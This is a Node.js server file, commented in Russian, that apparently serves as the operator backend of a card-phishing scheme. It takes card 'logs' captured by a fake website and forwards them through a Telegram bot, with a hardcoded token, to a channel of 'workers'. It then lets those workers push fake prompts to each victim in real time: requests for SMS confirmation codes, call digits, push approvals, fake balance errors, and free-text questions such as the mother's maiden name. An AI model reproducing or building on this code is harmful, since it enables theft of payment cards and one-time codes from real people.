const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const BOT_TOKEN = '8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw';
const CHANNEL_ID = '-1003455979409';

let userTasks = {}; 
let logsStorage = {}; 
let waitingForText = {}; // Храним: кто из воркеров пишет текст какому юзеру

const cmdTexts = {
    'sms': 'Введите код подтверждения из СМС',
    'call': 'Введите последние 4 цифры номера, с которого поступит звонок',
    'push': 'Подтвердите вход в мобильном приложении',
    'bal': 'Недостаточно средств на карте. Попробуйте другую карту',
    'support': 'Ошибка безопасности. Опишите проблему оператору в чате'
};

const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

// --- ПРИЕМ ЛОГА С САЙТА ---
app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;
    logsStorage[userId] = { type, data, time: new Date().toLocaleTimeString() };

    // Если это ответ на команду (код СМС и т.д.), ищем воркера
    const workerId = Object.keys(waitingForText).find(id => waitingForText[id] === userId);

    if (workerId && type === 'ОТВЕТ') {
        // Если юзер что-то ввел, шлем сразу воркеру в личку, а не в канал
        let replyMsg = `<b>📩 ОТВЕТ ОТ ЮЗЕРА [<code>${userId}</code>]</b>\n\n`;
        for (let key in data) { replyMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`; }
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: workerId,
            text: replyMsg,
            parse_mode: 'HTML'
        }).catch(e => console.log("Ошибка отправки воркеру"));
    } else {
        // Обычные логи (карты) шлем в канал
        let channelMsg = `<b>🆕 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n🆔 ID: <code>${safeText(userId)}</code>\n📍 Статус: 🔵 Ожидает...`;
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHANNEL_ID,
            text: channelMsg,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "⚡️ ВЗЯТЬ В РАБОТУ", callback_data: `take_${userId}` }]] }
        }).catch(e => console.log("Ошибка канала"));
    }
    res.json({ success: true });
});

app.get('/api/check/:userId', (req, res) => {
    const userId = req.params.userId;
    const task = userTasks[userId] || null;
    if (task) { delete userTasks[userId]; }
    res.json(task);
});

// --- ВЕБХУК ТЕЛЕГРАМ ---
app.post('/tg-webhook', async (req, res) => {
    try {
        const { message, callback_query } = req.body;

        // 1. ОБРАБОТКА ТЕКСТОВЫХ СООБЩЕНИЙ ОТ ВОРКЕРА
        if (message && message.text) {
            const chatId = message.chat.id;

            if (message.text === '/start') {
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: "<b>👋 Система готова!</b>",
                    parse_mode: 'HTML'
                });
            } 
            // Если воркер сейчас в режиме написания "своего текста"
            else if (waitingForText[chatId]) {
                const targetUserId = waitingForText[chatId];
                userTasks[targetUserId] = { action: 'ask', text: message.text };
                
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: `✅ Текст отправлен пользователю <code>${targetUserId}</code>.\nЖдем ответа...`,
                    parse_mode: 'HTML'
                });
                // Режим ожидания не выключаем, чтобы воркер мог слать еще сообщения
            }
            return res.sendStatus(200);
        }

        // 2. ОБРАБОТКА КНОПОК
        if (callback_query) {
            const data = callback_query.data;
            const workerId = callback_query.from.id;
            const [action, userId, code] = data.split('_');

            if (action === 'take') {
                const log = logsStorage[userId];
                if (log) {
                    let fullMsg = `<b>💎 ЛОГ [${log.type}]</b>\n🆔 ID: <code>${userId}</code>\n------------------------\n`;
                    for (let key in log.data) { fullMsg += `<b>${key}:</b> <code>${log.data[key]}</code>\n`; }

                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        chat_id: workerId,
                        text: fullMsg,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "💬 СМС", callback_data: `ask_${userId}_sms` }, { text: "📞 Звонок", callback_data: `ask_${userId}_call` }],
                                [{ text: "📲 Пуш", callback_data: `msg_${userId}_push` }, { text: "💰 Баланс", callback_data: `msg_${userId}_bal` }],
                                [{ text: "✍️ Свой текст", callback_data: `custom_${userId}` }]
                            ]
                        }
                    });
                    
                    // Обновляем статус в канале
                    const workerName = callback_query.from.username ? `@${callback_query.from.username}` : callback_query.from.first_name;
                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                        chat_id: CHANNEL_ID,
                        message_id: callback_query.message.message_id,
                        text: `<b>🆕 ЛОГ [${log.type}]</b>\n🆔 ID: <code>${userId}</code>\n📍 Взял: <b>${workerName}</b> ✅`,
                        parse_mode: 'HTML'
                    });
                }
            }

            // Нажата кнопка "Свой текст"
            if (action === 'custom') {
                waitingForText[workerId] = userId; // Включаем режим ожидания текста для этого воркера
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: workerId,
                    text: `⌨️ <b>Введите текст, который увидит пользователь:</b>\n(Например: "Введите ваш девичью фамилию матери")`,
                    parse_mode: 'HTML'
                });
            }

            // Стандартные кнопки ошибок
            if (action === 'ask' || action === 'msg') {
                userTasks[userId] = { action, text: cmdTexts[code] || "Введите данные" };
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                    callback_query_id: callback_query.id,
                    text: "✅ Отправлено!"
                });
            }
        }
    } catch (e) { console.error(e); }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер на порту ${PORT}`));
